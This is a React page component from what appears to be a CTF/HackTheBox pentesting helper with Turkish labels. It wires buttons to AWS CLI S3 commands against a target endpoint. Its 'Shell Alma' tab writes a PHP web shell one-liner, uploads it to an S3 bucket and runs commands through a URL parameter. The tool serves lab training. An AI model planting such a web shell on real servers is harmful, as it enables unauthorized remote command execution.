import { useRef, useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { useTerminal } from '../hooks/useTerminal';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';

const termId = 'aws-main';

function AwsTerm() {
  const containerRef = useRef(null);
  const { isReady } = useTerminal(termId, containerRef);
  return (
    <div className="terminal-container" style={{ height: 240 }}>
      <div className="terminal-titlebar">
        <div className="terminal-dots">
          <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
        </div>
        <div className="terminal-title">
          {isReady ? <span style={{ color: 'var(--accent-green)' }}>● aws cli</span> : <span style={{ color: 'var(--text-muted)' }}>○ bağlanıyor...</span>}
        </div>
      </div>
      <div ref={containerRef} style={{ height: 202, padding: '4px 2px' }} />
    </div>
  );
}

export default function AwsPage({ onBack }) {
  const { activeJob } = useJobs();
  const { socket } = useSocket();
  const [endpoint, setEndpoint] = useState('http://s3.target.htb');
  const [tab, setTab] = useState('s3');

  return (
    <div>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
          <div className="page-title">☁ <span>AWS</span></div>
          <div className="page-subtitle">AWS CLI ve S3 bucket keşfi</div>
        </div>
      </div>

      <div className="page-tabs">
        {['s3', 'configure', 'shell'].map(t => (
          <div key={t} className={`page-tab ${tab === t ? 'active' : ''}`} onClick={() => setTab(t)}>
            {t === 's3' ? '🪣 S3' : t === 'configure' ? '⚙ Yapılandırma' : '🐚 Shell Alma'}
          </div>
        ))}
      </div>

      {tab === 's3' && (
        <>
          <div className="ip-bar" style={{ marginBottom: 12 }}>
            <span className="ip-bar-label">🌐 Endpoint</span>
            <input value={endpoint} onChange={e => setEndpoint(e.target.value)} placeholder="http://s3.target.htb" />
          </div>
          <div style={{ display: 'flex', gap: 10, marginBottom: 12, flexWrap: 'wrap' }}>
            <button className="btn btn-green" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 ls`)}>
              📋 Bucket Listele
            </button>
            <button className="btn btn-cyan" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 ls s3://<bucket>`)}>
              📂 Bucket İçeriği
            </button>
            <button className="btn btn-purple" onClick={() => sendCmd(socket, termId, `aws --endpoint-url ${endpoint} s3 cp s3://<bucket>/<dosya> .`)}>
              ⬇ Dosya İndir
            </button>
          </div>

          <AwsTerm />

          <SectionTitle icon="📋">S3 Komutları</SectionTitle>
          <InfoCard title="Temel S3 İşlemleri" icon="🪣" defaultOpen color="green">
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 ls`} desc="Tüm bucket'ları listele" termId={termId} />
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 ls s3://<bucket>`} desc="Bucket içeriğini listele" termId={termId} />
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 cp s3://<bucket>/<dosya> .`} desc="Dosyayı indir (. = bulunduğun dizin)" termId={termId} />
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 cp s3://<bucket>/ . --recursive`} desc="Tüm bucket'ı indir" termId={termId} />
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 cp <dosya> s3://<bucket>/`} desc="Dosyayı bucket'a yükle" termId={termId} />
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 rm s3://<bucket>/<dosya>`} desc="Dosyayı sil" termId={termId} />
          </InfoCard>
          <InfoCard title="--endpoint-url Nedir?" icon="ℹ" color="purple">
            <div className="cmd-desc">
              <b>--endpoint-url</b>: AWS yerine özel bir S3 endpoint'i kullan.
              HTB/CTF'lerde gerçek AWS kullanılmaz; hedef makine kendi S3 emülatörünü çalıştırır.<br /><br />
              <b>aws configure</b>: Kimlik bilgisi olmadan çalışmak için dummy değerler yaz:<br />
              Access Key: <code>temp</code> &nbsp;|&nbsp; Secret: <code>temp</code> &nbsp;|&nbsp; Region: <code>us-east-1</code>
            </div>
          </InfoCard>
        </>
      )}

      {tab === 'configure' && (
        <>
          <AwsTerm />
          <SectionTitle icon="⚙">Yapılandırma</SectionTitle>
          <InfoCard title="aws configure – Hızlı Dummy Ayar" icon="⚙" defaultOpen color="cyan">
            <CmdLine cmd="aws configure" desc="Etkileşimli kurulum – aşağıdaki değerleri gir" termId={termId} />
            <div className="alert alert-purple" style={{ marginTop: 8 }}>
              <span>💡</span>
              <span>HTB için dummy değerler yeterli: <b>Access Key</b>: temp | <b>Secret</b>: temp | <b>Region</b>: us-east-1</span>
            </div>
            <CmdLine cmd={`cat > /tmp/credentials.json << 'EOF'
{
  "AccessKeyId": "temp",
  "SecretAccessKey": "temp",
  "SessionToken": null
}
EOF`} desc="Geçici credential dosyası oluştur" termId={termId} />
          </InfoCard>
          <InfoCard title="Environment Variable ile" icon="🌿" color="green">
            <CmdLine cmd="export AWS_ACCESS_KEY_ID=temp" termId={termId} />
            <CmdLine cmd="export AWS_SECRET_ACCESS_KEY=temp" termId={termId} />
            <CmdLine cmd="export AWS_DEFAULT_REGION=us-east-1" termId={termId} />
          </InfoCard>
        </>
      )}

      {tab === 'shell' && (
        <>
          <AwsTerm />
          <InfoCard title="S3 Üzerinden Shell" icon="🐚" defaultOpen color="orange">
            <div className="cmd-desc">PHP shell'i S3'e yükle, web sunucusu üzerinden çalıştır:</div>
            <CmdLine cmd={`echo '<?php system($_GET["cmd"]); ?>' > shell.php`} desc="Shell oluştur" termId={termId} />
            <CmdLine cmd={`aws --endpoint-url ${endpoint} s3 cp shell.php s3://<bucket>/shell.php`} desc="Shell'i S3'e yükle" termId={termId} />
            <div className="cmd-desc" style={{ marginTop: 8 }}>Erişim:</div>
            <div className="cmd-box" style={{ fontSize: 11 }}>{`${endpoint}/<bucket>/shell.php?cmd=whoami`}</div>
          </InfoCard>
        </>
      )}
    </div>
  );
}
